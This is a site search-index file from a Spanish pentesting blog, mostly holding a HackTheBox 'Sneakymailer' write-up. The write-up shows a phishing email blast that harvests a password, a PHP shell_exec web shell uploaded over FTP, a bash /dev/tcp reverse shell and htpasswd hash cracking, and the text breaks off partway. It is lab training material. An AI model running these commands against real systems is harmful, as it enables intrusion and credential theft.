
var documents = [{
    "id": 0,
    "url": "http://localhost:4000/404.html",
    "title": "404",
    "body": "  404  ¿Equivocado o perdido?  Intenta usar la barra de busqueda o hechale un vistazo al homepage. "
    }, {
    "id": 1,
    "url": "http://localhost:4000/about",
    "title": "Apasionado de la Ciberseguridad y la Programación.",
    "body": " Pentester: Certificaciones eJPT, eCPPTv2, eWPTXv2 - Experiencia en programación, networking y bases de datos Sql.  "
    }, {
    "id": 2,
    "url": "http://localhost:4000/categories",
    "title": "Categories",
    "body": ""
    }, {
    "id": 3,
    "url": "http://localhost:4000/",
    "title": "Home",
    "body": "                                                                                               Maquina - Sneakymailer              :       Hoy vamos a resolver una máquina hackthebox de dificultad media, la cual explotaremos a partir de información lekeada y realizando un ataque masivo de email, después migraremos a otro usuario. . . :                                                                                               08 Apr 2023                                                                                                                           Python3              :       En esta ocasion hablaremos del lenguaje de programacion Python3, realizaremos todo un curso completo desde lo mas basico y explicaremos todo lo escencial para que se pueda llegar a dominar. . . :                                                                                               30 Mar 2023                                                                                                                           Windows 10 y 11 ya tienen parches para las capturas de pantalla              :       Despues que unos investigadores de ciberseguridad habían descubierto un fallo en los móviles Google Pixel y los ordenadores con Windows. Según explicaban, el editor de capturas de pantalla de estos. . . :                                                                                               28 Mar 2023                                                                                                                           Maquina - Querier              :       El dia de hoy vamos a estar resolviendo la maquina Querier de hackthebox que es una Windows de dificultad Media. Comenzaremos enumerando los recursos compartidos smb para obtener la contraseña. . . :                                                                                               28 Mar 2023                                                                                                                           Maquina - Ophiuchu              :       Hoy vamos a hacer una máquina hackthebox de dificultad media, la cual va a ser explotada utilizando la vulnerabilidad de deserialización de YAML para SnakeYAML utilizada en aplicaciones java, y. . . :                                                                                               24 Mar 2023                                                                                                                           Maquina - Multimaster              :       Hola de nuevo el de hoy vamos a estar resolviendo la maquina Multimaster de hackthebox que es una maquina Windows de dificultad Insane, la cosa se va a tensar :smirk:. . . . :                                                                                               24 Mar 2023                                "
    }, {
    "id": 4,
    "url": "http://localhost:4000/robots.txt",
    "title": "",
    "body": "      Sitemap: {{ “sitemap. xml”   absolute_url }}   "
    }, {
    "id": 5,
    "url": "http://localhost:4000/hackthebox/htb-writeup-Sneakymailer",
    "title": "Maquina - Sneakymailer",
    "body": "2023/04/08 - Hoy vamos a resolver una máquina hackthebox de dificultad media, la cual explotaremos a partir de información lekeada y realizando un ataque masivo de email, después migraremos a otro usuario abusando de un pypi server creando un paquete malicioso y finalmente escalaremos privilegios como el usuario root abusando de un privilegio de sudoers en pip3. Vamos a comenzar creando un directorio con el nombre de la maquina: ❯ mkdir Sneakymailer❯ ls SneakymailerSeguidamente con la funcion mkt crearemos nuestros directorios de trabajo: ❯ which mktmkt () {	mkdir {nmap, content, scripts}}❯ mkt❯ ls content  nmap  scriptsEnumeración #: Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeración, empezamos mandando una traza a la ip de la maquina victima con el comando ping: ❯ ping -c 1 10. 10. 10. 197PING 10. 10. 10. 197 (10. 10. 10. 197) 56(84) bytes of data. 64 bytes from 10. 10. 10. 197: icmp_seq=1 ttl=63 time=2582 ms--- 10. 10. 10. 197 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 2582. 173/2582. 173/2582. 173/0. 000 msVemos que la maquina nos responde ahora procederemos a el scaneo de puertos con la ayuda de nmap: Escaneo de Puertos:       Parámetro   Descripción         -p-   Escaneamos todos los 65535 puertos.        –open   Solo los puertos que estén abiertos.        -v   Permite ver en consola lo que va encontrando (verbose).        -oG   Guarda el output en un archivo con formato grepeable para que mediante una funcion de S4vitar nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles   Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre allPorts: ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10. 10. 10. 197 -oG openPortsHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower. Starting Nmap 7. 92 ( https://nmap. org ) at 2023-04-08 21:19 GMTInitiating SYN Stealth Scan at 21:19Scanning 10. 10. 10. 197 [65535 ports]Discovered open port 80/tcp on 10. 10. 10. 197Discovered open port 22/tcp on 10. 10. 10. 197Discovered open port 21/tcp on 10. 10. 10. 197Discovered open port 25/tcp on 10. 10. 10. 197Discovered open port 8080/tcp on 10. 10. 10. 197Discovered open port 143/tcp on 10. 10. 10. 197Discovered open port 993/tcp on 10. 10. 10. 197Completed SYN Stealth Scan at 21:20, 20. 33s elapsed (65535 total ports)Nmap scan report for 10. 10. 10. 197Host is up, received user-set (0. 31s latency). Scanned at 2023-04-08 21:19:57 GMT for 20sNot shown: 63699 closed tcp ports (reset), 1829 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT   STATE SERVICE  REASON21/tcp  open ftp    syn-ack ttl 6322/tcp  open ssh    syn-ack ttl 6325/tcp  open smtp    syn-ack ttl 6380/tcp  open http    syn-ack ttl 63143/tcp open imap    syn-ack ttl 63993/tcp open imaps   syn-ack ttl 638080/tcp open http-proxy syn-ack ttl 63Read data files from: /usr/bin/. . /share/nmapNmap done: 1 IP address (1 host up) scanned in 20. 46 seconds      Raw packets sent: 98589 (4. 338MB) | Rcvd: 88844 (3. 554MB)Escaneo de Version y Servicios. : ❯ nmap -sCV -p21,22,25,80,143,993,8080 10. 10. 10. 197 -oN targetedStarting Nmap 7. 92 ( https://nmap. org ) at 2023-04-08 21:21 GMTNmap scan report for 10. 10. 10. 197Host is up (0. 40s latency). PORT   STATE SERVICE VERSION21/tcp  open ftp   vsftpd 3. 0. 322/tcp  open ssh   OpenSSH 7. 9p1 Debian 10+deb10u2 (protocol 2. 0)| ssh-hostkey: |  2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA)|  256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA)|_ 256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519)25/tcp  open smtp   Postfix smtpd|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING80/tcp  open http   nginx 1. 14. 2|_http-title: Did not follow redirect to http://sneakycorp. htb|_http-server-header: nginx/1. 14. 2143/tcp open imap   Courier Imapd (released 2018)|_imap-capabilities: THREAD=REFERENCES OK IDLE CHILDREN ACL2=UNION STARTTLS UIDPLUS SORT NAMESPACE ACL completed CAPABILITY QUOTA IMAP4rev1 UTF8=ACCEPTA0001 ENABLE THREAD=ORDEREDSUBJECT|_ssl-date: TLS randomness does not represent time| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US| Subject Alternative Name: email:postmaster@example. com| Not valid before: 2020-05-14T17:14:21|_Not valid after: 2021-05-14T17:14:21993/tcp open ssl/imap Courier Imapd (released 2018)|_imap-capabilities: THREAD=REFERENCES OK IDLE CHILDREN ACL2=UNION UIDPLUS SORT NAMESPACE ACL AUTH=PLAIN completed CAPABILITY QUOTA IMAP4rev1 UTF8=ACCEPTA0001 ENABLE THREAD=ORDEREDSUBJECT| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US| Subject Alternative Name: email:postmaster@example. com| Not valid before: 2020-05-14T17:14:21|_Not valid after: 2021-05-14T17:14:21|_ssl-date: TLS randomness does not represent time8080/tcp open http   nginx 1. 14. 2|_http-open-proxy: Proxy might be redirecting requests|_http-title: Welcome to nginx!|_http-server-header: nginx/1. 14. 2Service Info: Host: debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap. org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 78. 06 secondsVisulizamos información interesante de los puertos escaneados:       Puerto   Servicio   Versión         21   FTP   vsftpd 3. 0. 3       22   SSH   OpenSSH 7. 9p1       25   SMTP   Postfix smtpd       80   HTTP   nginx 1. 14. 2       143   IMAP   Courier Imapd       993   IMAP/SSL   Courier Imapd       8080   HTTP   nginx 1. 14. 2   Comenzando primeramente intentaremos conectarnos como el usuario anonymous por el servicio ftp ❯ ftp 10. 10. 10. 197Connected to 10. 10. 10. 197. 220 (vsFTPd 3. 0. 3)Name (10. 10. 10. 197:fmiracle): anonymous530 Permission denied. Login failed. ftp&gt;Vemos que no contamos con acceso asi que proseguiremos a usar la herramienta whatweb para ver el gestor de contenido de los servicios http ❯ whatweb http://10. 10. 10. 197http://10. 10. 10. 197 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[nginx/1. 14. 2], IP[10. 10. 10. 197], RedirectLocation[http://sneakycorp. htb], Title[301 Moved Permanently], nginx[1. 14. 2]http://sneakycorp. htb [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1. 14. 2], IP[10. 10. 10. 197], JQuery, Script, Title[Employee - Dashboard], X-UA-Compatible[IE=edge], nginx[1. 14. 2]❯ whatweb http://10. 10. 10. 197:8080http://10. 10. 10. 197:8080 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1. 14. 2], IP[10. 10. 10. 197], Title[Welcome to nginx!], nginx[1. 14. 2]whatweb nos reporta que se esta aplicando virtual hosting, concretamente al dominio http://sneakycorp. htb asi que comenzemos agregandolo a nuestro /etc/hosts echo  10. 10. 10. 197 sneakycorp. htb  &gt;&gt; /etc/hostsExplotación #: Vamos a proceder a abrir la pagina web.  Podemos observar un proyecto que nos habla de pypi, pero que es pypi  El Python Package Index o PyPI es el repositorio de software oficial para aplicaciones de terceros en el lenguaje de programación Python.  Observamos un potencial de correos filtrados de la compañia Parceamos los correos filtrados usando la siguente expresión y los exportamos a un fichero de nombre mails. txt curl -s -X GET  http://sneakycorp. htb/team. php  | grep  sneakymailer  | html2text | xargs | tr ' ' ',' &gt; mails. txt❯ /bin/cat mails. txttigernixon@sneakymailer. htb,garrettwinters@sneakymailer. htb,ashtoncox@sneakymailer. htb,cedrickelly@sneakymailer. htb,airisatou@sneakymailer. htb,briellewilliamson@sneakymailer. htb,herrodchandler@sneakymailer. htb,rhonadavidson@sneakymailer. htb,colleenhurst@sneakymailer. htb,sonyafrost@sneakymailer. htb,jenagaines@sneakymailer. htb,quinnflynn@sneakymailer. htb,chardemarshall@sneakymailer. htb,haleykennedy@sneakymailer. htb,tatyanafitzpatrick@sneakymailer. htb,michaelsilva@sneakymailer. htb,paulbyrd@sneakymailer. htb,glorialittle@sneakymailer. htb,bradleygreer@sneakymailer. htb,dairios@sneakymailer. htb,jenettecaldwell@sneakymailer. htb,yuriberry@sneakymailer. htb,caesarvance@sneakymailer. htb,doriswilder@sneakymailer. htb,angelicaramos@sneakymailer. htb,gavinjoyce@sneakymailer. htb,jenniferchang@sneakymailer. htb,brendenwagner@sneakymailer. htb,fionagreen@sneakymailer. htb,shouitou@sneakymailer. htb,michellehouse@sneakymailer. htb,sukiburks@sneakymailer. htb,prescottbartlett@sneakymailer. htb,gavincortez@sneakymailer. htb,martenamccray@sneakymailer. htb,unitybutler@sneakymailer. htb,howardhatfield@sneakymailer. htb,hopefuentes@sneakymailer. htb,vivianharrell@sneakymailer. htb,timothymooney@sneakymailer. htb,jacksonbradshaw@sneakymailer. htb,olivialiang@sneakymailer. htb,brunonash@sneakymailer. htb,sakurayamamoto@sneakymailer. htb,thorwalton@sneakymailer. htb,finncamacho@sneakymailer. htb,sergebaldwin@sneakymailer. htb,zenaidafrank@sneakymailer. htb,zoritaserrano@sneakymailer. htb,jenniferacosta@sneakymailer. htb,carastevens@sneakymailer. htb,hermionebutler@sneakymailer. htb,laelgreer@sneakymailer. htb,jonasalexander@sneakymailer. htb,shaddecker@sneakymailer. htb,sulcud@sneakymailer. htb,donnasnider@sneakymailer. htbComo antes nos reporto nmap el servicio imap se encuentra activo y como ahora disponemos de una lista de correos, podemos tratar de enviar un correo como cualquier usuario y ver si se nos permite de estar mal configurado. Para eso usaremos la herramienta swaks  para instalar la herramienta solo basta con hacer un apt install swaks Especificaremos con los comandos from el correo origen, --to la lista de correos que obtuvimos, en el body podemos tratar de enviar un enlace a un servidor http que nos compartiremos de manera local, de modo que si alguno de los usuarios destinatarios esta abriendo el correo y pinche en el enlace, causara que nos envie una solicitud. ❯ swaks --from fmiracle@sneakymailer. htb --to tigernixon@sneakymailer. htb,garrettwinters@sneakymailer. htb,ashtoncox@sneakymailer. htb,cedrickelly@sneakymailer. htb,airisatou@sneakymailer. htb,briellewilliamson@sneakymailer. htb,herrodchandler@sneakymailer. htb,rhonadavidson@sneakymailer. htb,colleenhurst@sneakymailer. htb,sonyafrost@sneakymailer. htb,jenagaines@sneakymailer. htb,quinnflynn@sneakymailer. htb,chardemarshall@sneakymailer. htb,haleykennedy@sneakymailer. htb,tatyanafitzpatrick@sneakymailer. htb,michaelsilva@sneakymailer. htb,paulbyrd@sneakymailer. htb,glorialittle@sneakymailer. htb,bradleygreer@sneakymailer. htb,dairios@sneakymailer. htb,jenettecaldwell@sneakymailer. htb,yuriberry@sneakymailer. htb,caesarvance@sneakymailer. htb,doriswilder@sneakymailer. htb,angelicaramos@sneakymailer. htb,gavinjoyce@sneakymailer. htb,jenniferchang@sneakymailer. htb,brendenwagner@sneakymailer. htb,fionagreen@sneakymailer. htb,shouitou@sneakymailer. htb,michellehouse@sneakymailer. htb,sukiburks@sneakymailer. htb,prescottbartlett@sneakymailer. htb,gavincortez@sneakymailer. htb,martenamccray@sneakymailer. htb,unitybutler@sneakymailer. htb,howardhatfield@sneakymailer. htb,hopefuentes@sneakymailer. htb,vivianharrell@sneakymailer. htb,timothymooney@sneakymailer. htb,jacksonbradshaw@sneakymailer. htb,olivialiang@sneakymailer. htb,brunonash@sneakymailer. htb,sakurayamamoto@sneakymailer. htb,thorwalton@sneakymailer. htb,finncamacho@sneakymailer. htb,sergebaldwin@sneakymailer. htb,zenaidafrank@sneakymailer. htb,zoritaserrano@sneakymailer. htb,jenniferacosta@sneakymailer. htb,carastevens@sneakymailer. htb,hermionebutler@sneakymailer. htb,laelgreer@sneakymailer. htb,jonasalexander@sneakymailer. htb,shaddecker@sneakymailer. htb,sulcud@sneakymailer. htb,donnasnider@sneakymailer. htb --body  Entra aqui -&gt; http://10. 10. 16. 2/test  --server 10. 10. 10. 197=== Trying 10. 10. 10. 197:25. . . === Connected to 10. 10. 10. 197. &lt;- 220 debian ESMTP Postfix (Debian/GNU) -&gt; EHLO hack4u&lt;- 250-debian&lt;- 250-PIPELINING&lt;- 250-SIZE 10240000&lt;- 250-VRFY&lt;- 250-ETRN&lt;- 250-STARTTLS&lt;- 250-ENHANCEDSTATUSCODES&lt;- 250-8BITMIME&lt;- 250-DSN&lt;- 250-SMTPUTF8&lt;- 250 CHUNKING -&gt; MAIL FROM:&lt;fmiracle@sneakymailer. htb&gt;&lt;- 250 2. 1. 0 Ok -&gt; RCPT TO:&lt;tigernixon@sneakymailer. htb&gt;Nos ponemos en escucha con ncat en el puerto 80 y recibimos una petición post. ❯ ncat -nlvp 80Ncat: Version 7. 92 ( https://nmap. org/ncat )Ncat: Listening on :::80Ncat: Listening on 0. 0. 0. 0:80Ncat: Connection from 10. 10. 10. 197. Ncat: Connection from 10. 10. 10. 197:39458. POST /test HTTP/1. 1Host: 10. 10. 16. 2User-Agent: python-requests/2. 23. 0Accept-Encoding: gzip, deflateAccept: */*Connection: keep-aliveContent-Length: 185Content-Type: application/x-www-form-urlencodedfirstName=Paul&amp;lastName=Byrd&amp;email=paulbyrd%40sneakymailer. htb&amp;password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&amp;rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHtTramos la data y lo exportamos a un ficherito llamando credentials. txt, donde podemos ver las credenciales de el usuario Paul ❯ php --interactiveInteractive mode enabledphp &gt; echo urldecode( firstName=Paul&amp;lastName=Byrd&amp;email=paulbyrd%40sneakymailer. htb&amp;password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&amp;rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt );firstName=Paul&amp;lastName=Byrd&amp;email=paulbyrd@sneakymailer. htb&amp;password=^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht&amp;rpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht❯ /bin/cat credentials. txtfirstName=PaullastName=Byrdemail=paulbyrd@sneakymailer. htbpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Htrpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:HtAhora provaremos conectarnos con telnet al puerto 143 con esas credenciales.  Puedes guiarte de este articulo donde se explica a detalle como realizar la conexión con telnet y hacer uso de los parametros.  https://blog. andrewc. com/2013/01/connect-to-imap-server-with-telnet/❯ telnet 10. 10. 10. 197 143Trying 10. 10. 10. 197. . . Connected to 10. 10. 10. 197. Escape character is '^]'. * OK [CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT] Courier-IMAP ready. Copyright 1998-2018 Double Precision, Inc.  See COPYING for distribution information. a1 LOGIN paulbyrd ^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht* OK [ALERT] Filesystem notification initialization error -- contact your mail administrator (check for configuration errors with the FAM/Gamin library)a1 OK LOGIN Ok. a2 LIST     * * LIST (\Unmarked \HasChildren)  .    INBOX * LIST (\HasNoChildren)  .    INBOX. Trash * LIST (\HasNoChildren)  .    INBOX. Sent * LIST (\HasNoChildren)  .    INBOX. Deleted Items * LIST (\HasNoChildren)  .    INBOX. Sent Items a2 OK LIST completeda3 EXAMINE  INBOX. Trash * FLAGS (\Draft \Answered \Flagged \Deleted \Seen \Recent)* OK [PERMANENTFLAGS ()] No permanent flags permitted* 0 EXISTS* 0 RECENT* OK [UIDVALIDITY 590600304] Ok* OK [MYRIGHTS  acdilrsw ] ACLa3 OK [READ-ONLY] Oka4 EXAMINE  INBOX. Sent * FLAGS (\Draft \Answered \Flagged \Deleted \Seen \Recent)* OK [PERMANENTFLAGS ()] No permanent flags permitted* 0 EXISTS* 0 RECENT* OK [UIDVALIDITY 590600538] Ok* OK [MYRIGHTS  acdilrsw ] ACLa4 OK [READ-ONLY] Oka5 EXAMINE  INBOX. Deleted Items * FLAGS (\Draft \Answered \Flagged \Deleted \Seen \Recent)* OK [PERMANENTFLAGS ()] No permanent flags permitted* 0 EXISTS* 0 RECENT* OK [UIDVALIDITY 589481592] Ok* OK [MYRIGHTS  acdilrsw ] ACLa5 OK [READ-ONLY] Oka6 EXAMINE  INBOX. Sent Items * FLAGS (\Draft \Answered \Flagged \Deleted \Seen \Recent)* OK [PERMANENTFLAGS ()] No permanent flags permitted* 2 EXISTS* 0 RECENT* OK [UIDVALIDITY 589480766] Ok* OK [MYRIGHTS  acdilrsw ] ACLa6 OK [READ-ONLY] OkExaminado la ultima bandeja encontramos 2 correos existentes y visualizando el primer correo optenemos unas credenciales del usuario developer a7 FETCH 1 BODY[]* 1 FETCH (BODY[] {2167}MIME-Version: 1. 0To: root &lt;root@debian&gt;From: Paul Byrd &lt;paulbyrd@sneakymailer. htb&gt;Subject: Password resetDate: Fri, 15 May 2020 13:03:37 -0500Importance: normalX-Priority: 3Content-Type: multipart/alternative;	boundary= _21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_ --_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_Content-Transfer-Encoding: quoted-printableContent-Type: text/plain; charset= utf-8 Hello administrator, I want to change this password for the developer accou=ntUsername: developerOriginal-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]CPlease notify me when you do it=20--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_Content-Transfer-Encoding: quoted-printableContent-Type: text/html; charset= utf-8 &lt;html xmlns:o=3D urn:schemas-microsoft-com:office:office  xmlns:w=3D urn:sc=hemas-microsoft-com:office:word  xmlns:m=3D http://schemas. microsoft. com/of=fice/2004/12/omml  xmlns=3D http://www. w3. org/TR/REC-html40 &gt;&lt;head&gt;&lt;meta ht=tp-equiv=3DContent-Type content=3D text/html; charset=3Dutf-8 &gt;&lt;meta name==3DGenerator content=3D Microsoft Word 15 (filtered medium) &gt;&lt;style&gt;&lt;!--/* Font Definitions */@font-face	{font-family: Cambria Math ;	panose-1:2 4 5 3 5 4 6 3 2 4;}@font-face	{font-family:Calibri;	panose-1:2 15 5 2 2 2 4 3 2 4;}/* Style Definitions */p. MsoNormal, li. MsoNormal, div. MsoNormal	{margin:0in;	margin-bottom:. 0001pt;	font-size:11. 0pt;	font-family: Calibri ,sans-serif;}. MsoChpDefault	{mso-style-type:export-only;}@page WordSection1	{size:8. 5in 11. 0in;	margin:1. 0in 1. 0in 1. 0in 1. 0in;}div. WordSection1	{page:WordSection1;}--&gt;&lt;/style&gt;&lt;/head&gt;&lt;body lang=3DEN-US link=3Dblue vlink=3D #954F72 &gt;&lt;div cla=ss=3DWordSection1&gt;&lt;p class=3DMsoNormal&gt;Hello administrator, I want to chang=e this password for the developer account&lt;/p&gt;&lt;p class=3DMsoNormal&gt;&lt;o:p&gt;&amp;nbs=p;&lt;/o:p&gt;&lt;/p&gt;&lt;p class=3DMsoNormal&gt;Username: developer&lt;/p&gt;&lt;p class=3DMsoNorma=l&gt;Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C&lt;/p&gt;&lt;p class=3DMsoNorm=al&gt;&lt;o:p&gt;&amp;nbsp;&lt;/o:p&gt;&lt;/p&gt;&lt;p class=3DMsoNormal&gt;Please notify me when you do i=t &lt;/p&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;=--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_--)a7 OK FETCH completed. Como ahora disponemos de credenciales nuevas:  developer:m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]CVolemos a tratar de conectarnos por ftp y esta vez la conexión es exitosa. ❯ ftp 10. 10. 10. 197Connected to 10. 10. 10. 197. 220 (vsFTPd 3. 0. 3)Name (10. 10. 10. 197:fmiracle): developer331 Please specify the password. Password:230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp&gt; ftp&gt; dir200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxrwxr-x  8 0    1001     4096 Jun 30 2020 dev226 Directory send OK. ftp&gt; cd dev250 Directory successfully changed. ftp&gt; dir200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x  2 0    0      4096 May 26 2020 cssdrwxr-xr-x  2 0    0      4096 May 26 2020 img-rwxr-xr-x  1 0    0      13742 Jun 23 2020 index. phpdrwxr-xr-x  3 0    0      4096 May 26 2020 jsdrwxr-xr-x  2 0    0      4096 May 26 2020 pypidrwxr-xr-x  4 0    0      4096 May 26 2020 scss-rwxr-xr-x  1 0    0      26523 May 26 2020 team. phpdrwxr-xr-x  8 0    0      4096 May 26 2020 vendor226 Directory send OK. ftp&gt;Despues de conectarnos visualizamos un directorio dev y dentro un contenido de nombre team. php, que curiosamente era la ruta de la pagina donde estaban expuestos los correos. Para poder saber si tenemos permiso de escritura intentaremos subir un archivo de nombre cmd. php que con el uso de la función shell_exec me ejecute un comando a nivel de sistema que vamos a controlar con el parametro cmd &lt;?php  echo  &lt;pre&gt;  . shell_exec($_REQUEST['cmd']) .  &lt;/pre&gt; ;?&gt;Comprobamos que efectivamente si podemos subir el archivo ftp&gt; put cmd. phplocal: cmd. php remote: cmd. php200 PORT command successful. Consider using PASV. 150 Ok to send data. d226 Transfer complete. 69 bytes sent in 0. 00 secs (811. 8411 kB/s)ftp&gt; dir200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. --wxrw-rw-  1 1001   1001      69 Apr 08 19:15 cmd. phpdrwxr-xr-x  2 0    0      4096 May 26 2020 cssdrwxr-xr-x  2 0    0      4096 May 26 2020 img-rwxr-xr-x  1 0    0      13742 Jun 23 2020 index. phpdrwxr-xr-x  3 0    0      4096 May 26 2020 jsdrwxr-xr-x  2 0    0      4096 May 26 2020 pypidrwxr-xr-x  4 0    0      4096 May 26 2020 scss-rwxr-xr-x  1 0    0      26523 May 26 2020 team. phpdrwxr-xr-x  8 0    0      4096 May 26 2020 vendor226 Directory send OK. ftp&gt;Visitamos la url, pero esta vez apuntaremos al fichero que subimos.  El servicio nos reporta un codigo de estado 400 lo que corresponde a que el archivo no existe… Pero dado a que existe un directorio dev podemos pensar que puede ser un posible subdominio, asi que usaremos gobuster para tratar de enumerar posibles subdominios validos existentes y usaremos el diccionario subdomains-top1million-5000. txt del repositorio de seclists  https://github. com/OJ/gobuster https://github. com/danielmiessler/SecLists❯ gobuster vhost -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000. txt -u http://sneakycorp. htb/ -t 200===============================================================Gobuster v3. 1. 0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url:     http://sneakycorp. htb/[+] Method:    GET[+] Threads:   200[+] Wordlist:   /opt/SecLists/Discovery/DNS/subdomains-top1million-5000. txt[+] User Agent:  gobuster/3. 1. 0[+] Timeout:   10s===============================================================2023/04/08 23:21:48 Starting gobuster in VHOST enumeration mode===============================================================Found: dev. sneakycorp. htb (Status: 200) [Size: 13742]                           ===============================================================2023/04/08 23:21:58 Finished===============================================================Pues gobuster nos reporta que el subdominio es valido, lo que quiere decir que el archivo que subimos antes existe, pero bajo ese subdominio. Procedemos a subir nuevamente el archivo ya que a intervalos de tiempo nos lo borra ftp&gt; put cmd. phplocal: cmd. php remote: cmd. php200 PORT command successful. Consider using PASV. 150 Ok to send data. 226 Transfer complete. 69 bytes sent in 0. 00 secs (990. 9237 kB/s)ftp&gt;Volvemos a visitar la url esta vez apuntando al subdominio y al archivo subido no sin antes agregar el subdominio a nuestro /etc/hosts ❯ echo  10. 10. 10. 197 dev. sneakycorp. htb  &gt;&gt; /etc/hostsEsta vez si podemos apuntar al archivo cmd. php y con el parametro cmd tal y como lo habiamos especificado, podemos ejecutar comandos.  Lo siguiente sera ganar acceso a la maquina, mandandonos una shell reversa a nuestra maquina local, ello lo haremos con bash con el comando bash -c 'bash -i &gt;&amp; /dev/tcp/10. 10. 16. 2/443 0&gt;&amp;1' No olvidemos poner los &amp; en urleconde %26 para evitar problemas, y enviamos la petición Nos ponemos en escucha y recimos la conexión como el usuario www-data ❯ ncat -nlvp 443Ncat: Version 7. 92 ( https://nmap. org/ncat )Ncat: Listening on :::443Ncat: Listening on 0. 0. 0. 0:443Ncat: Connection from 10. 10. 10. 197. Ncat: Connection from 10. 10. 10. 197:37818. bash: cannot set terminal process group (734): Inappropriate ioctl for devicebash: no job control in this shellwww-data@sneakymailer:~/dev. sneakycorp. htb/dev$ whoamiwhoamiwww-dataComo siempre al ser una maquina linux hacemos un tratamiento de la tty para que sea full interactiva y ajustamos el tamaño de las proporciones de la pantall. www-data@sneakymailer:~/dev. sneakycorp. htb/dev$ script /dev/null -c bashscript /dev/null -c bashScript started, file is /dev/nullwww-data@sneakymailer:~/dev. sneakycorp. htb/dev$ ^Zzsh: suspended ncat -nlvp 443❯ stty raw -echo; fg[1] + continued ncat -nlvp 443                reset xtermwww-data@sneakymailer:~/dev. sneakycorp. htb/dev$ export TERM=xtermwww-data@sneakymailer:~/dev. sneakycorp. htb/dev$ export SHELL=bashwww-data@sneakymailer:~/dev. sneakycorp. htb/dev$ stty rows 48 columns 184Una vez en la maquina listamos los procesos corriendo y vemos uno correspondiente a pypi www-data@sneakymailer:~/dev. sneakycorp. htb/dev$ ps -faux | grep 5000www-data 7185 0. 0 0. 0  3084  824 pts/0  S+  19:49  0:00 |              \_ grep 5000pypi    741 0. 0 0. 6 36804 25824 ?    Ss  17:09  0:08 /var/www/pypi. sneakycorp. htb/venv/bin/python3 /var/www/pypi. sneakycorp. htb/venv/bin/pypi-server -i 127. 0. 0. 1 -p 5000 -a update,download,list -P /var/www/pypi. sneakycorp. htb/. htpasswd --disable-fallback -o /var/www/pypi. sneakycorp. htb/packageswww-data@sneakymailer:~/dev. sneakycorp. htb/dev$Podemos ver que se establece un tipo de conexión procediente de un archivo asi que procederemos a leeerlo www-data@sneakymailer:~/dev. sneakycorp. htb/dev$ cat /var/www/pypi. sneakycorp. htb/. htpasswdpypi:$apr1$RV5c5YVs$U9. OTqF5n8K4mxWpSSR/p/Vemos una contraseña encryptada que procederemos a crackearla por fuerza bruta con john ❯ john --wordlist=/usr/share/wordlists/rockyou. txt hashWarning: detected hash type  md5crypt , but the string is also recognized as  md5crypt-long Use the  --format=md5crypt-long  option to force loading these as that type insteadUsing default input encoding: UTF-8Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 512/512 AVX512BW 16x3])Will run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statussoufianeelhaoui (?)1g 0:00:00:08 DONE (2023-04-08 23:53) 0. 1172g/s 419023p/s 419023c/s 419023C/s soulfire1. . souderton16Use the  --show  option to display all of the cracked passwords reliablySession completedObtenemos nuevas credenciales pypi:soufianeelhaoui Como vimos que por detras esta configurado un nginx vamos a listar los sitios disponibles del directorio sites-available Encotramos el subdominio pypi. sneakycorp. htb que esta en escucha por el puerto 8080 www-data@sneakymailer:~/dev. sneakycorp. htb/dev$ cat /etc/nginx/sites-available/pypi. sneakycorp. 